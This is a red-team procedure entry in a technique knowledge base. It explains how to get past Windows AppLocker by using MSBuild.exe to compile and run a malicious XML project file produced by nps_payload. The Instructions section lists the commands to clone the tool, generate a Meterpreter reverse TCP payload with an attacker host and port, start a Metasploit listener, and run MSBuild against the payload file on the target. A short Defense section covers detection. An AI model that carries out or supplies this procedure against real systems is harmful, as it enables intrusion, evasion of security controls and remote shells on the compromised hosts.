---
id: 9d2cb5e5-7584-40cc-8c57-39c6cadc0713
name: Windows-AppLocker-Whitelist-Bypass-Using-MSBuild
type: procedure
verified: true
submitted: true
created_at: '2019-11-14T23:38:41.718812+00:00'
updated_at: '2023-05-25T19:42:14.035579+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Trusted-Developer-Utilities|T1127 - Trusted Developer
    Utilities]]
sub_techniques: []
platforms:
  - Windows
tags:
  - '[[tags/applocker]]'
  - '[[tags/Defense-Bypass]]'
commands:
  - '[[commands/git-clone-and-install-nps-payload]]'
  - '[[commands/python-run-nps-payload-generator]]'
  - '[[commands/msfconsole-load-resource-file]]'
  - '[[commands/msbuild-execute-xml-payload]]'
tools:
  - '[[tools/nps-payload]]'
  - '[[tools/metasploit-framework]]'
validated: true
---

# Windows-AppLocker-Whitelist-Bypass-Using-MSBuild

## Summary

This procedure bypasses Windows AppLocker restrictions by leveraging the whitelisted MSBuild.exe tool to execute a malicious payload, such as a Meterpreter reverse shell, without triggering AppLocker blocks on unsigned executables. It uses the nps_payload tool to generate an XML file that MSBuild compiles and runs, allowing code execution in environments where only Microsoft-signed binaries are permitted.

## Description

AppLocker is a Windows security feature that restricts executable files based on publisher, path, or hash rules. A common policy blocks non-Microsoft signed programs to prevent malware execution. However, MSBuild.exe, part of the .NET Framework and signed by Microsoft, is often whitelisted for legitimate build tasks. This procedure exploits this by generating a malicious XML project file using nps_payload, which embeds PowerShell code for payload execution. When MSBuild processes the XML, it executes the embedded code, bypassing AppLocker. This is effective on Windows systems with .NET Framework 4.0+ and requires write access to a directory like C:\Windows\Tasks. The technique maps to MITRE ATT&CK T1127 for abusing trusted developer utilities to evade defenses and execute code.

## Requirements

1. Attacker machine with Kali Linux or similar (for generating payloads using Python 2/3 and Metasploit).
2. Initial access to the target Windows machine (e.g., via RDP, compromised account) with write permissions to a directory like C:\Windows\Tasks.
3. .NET Framework 4.0 or later installed on the target (MSBuild.exe available at C:\Windows\Microsoft.NET\Framework\v4.0.30319\).
4. Network connectivity from target to attacker for reverse shell (e.g., open ports like 443).
5. Tools: nps_payload repository cloned, Metasploit Framework installed.

## Defense

- Enable detailed AppLocker event logging (Event ID 8004 for allowed executions) and monitor for MSBuild.exe spawning unusual processes like PowerShell.
- Use Windows Defender Application Control (WDAC) or stricter AppLocker rules to block MSBuild inline task execution.
- Implement PowerShell logging (Module, ScriptBlock, Transcription) to detect embedded payloads.
- Monitor for anomalous network connections from build tools and file writes to sensitive paths like C:\Windows\Tasks.
- Deploy endpoint detection tools to alert on .NET compilation events or XML file executions.

## Objectives

1. Generate a malicious XML payload that embeds a reverse shell without direct executable deployment.
2. Transfer and execute the XML on the target using whitelisted MSBuild.exe to bypass AppLocker.
3. Establish a Meterpreter session for post-exploitation.
4. Maintain stealth by avoiding unsigned binary execution.

## Instructions

### Step 1: Clone and Install nps_payload Tool

**Context**: Download and set up the nps_payload tool on the attacker machine to generate the MSBuild-compatible XML payload. This tool creates the necessary files for embedding a Metasploit payload into an XML format that MSBuild can process.

**Command** ([[commands/git-clone-and-install-nps-payload]]):
```bash
git clone https://github.com/trustedsec/nps_payload.git
cd nps_payload && pip install -r requirements.txt
```

> This clones the repository and installs dependencies like netifaces and pexpect. Expected output includes successful cloning and requirement satisfaction messages. Verify by checking the nps_payload directory exists.

### Step 2: Generate Payload XML Using nps_payload

**Context**: Run the nps_payload script interactively to create the msbuild_nps.xml file (for target execution) and msbuild_nps.rc (for Metasploit listener). Select options for a Meterpreter reverse TCP payload and input attacker details.

**Command** ([[commands/python-run-nps-payload-generator]]):
```bash
python2 nps_payload.py
```

> The script prompts for task selection (1 for MSBuild payload), payload type (1 for reverse_tcp), LHOST (e.g., 10.10.10.100), and LPORT (e.g., 443). It generates the XML and RC files. Expected output shows payload generation success and deployment instructions. Copy msbuild_nps.xml to the target via SMB, SCP, or existing access.

### Step 3: Set Up Metasploit Listener

**Context**: On the attacker machine, load the generated .rc file into Metasploit to start a handler that catches the reverse shell from the target.

**Command** ([[commands/msfconsole-load-resource-file]]):
```metasploit
msfconsole -r msbuild_nps.rc
```

> This configures a multi/handler with the specified payload, LHOST, and LPORT, running in background mode (-j -z). Expected output includes resource processing, payload settings confirmation, and handler startup on the specified port. Keep this running while executing on the target.

### Step 4: Identify Writable Directory and Transfer XML

**Context**: Locate a writable path on the target (e.g., C:\Windows\Tasks) to place the XML file, as AppLocker bypass relies on local execution. Transfer the file using available access methods.

No specific command here; use built-in tools like copy/paste via RDP or PowerShell remoting. Verify writability with `dir C:\Windows\Tasks` or similar. Place msbuild_nps.xml in the chosen directory.

### Step 5: Locate and Execute MSBuild with XML

**Context**: Find the MSBuild.exe path in the .NET Framework directory and run it against the transferred XML to compile and execute the embedded payload, triggering the reverse shell.

**Command** ([[commands/msbuild-execute-xml-payload]]):
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Tasks\msbuild_nps.xml
```

> Replace v4.0.30319 with the target's .NET version if different. Expected output shows Microsoft Build Engine startup and build initiation. Success is indicated by a new Meterpreter session in the Metasploit console, confirming the bypass and payload execution.
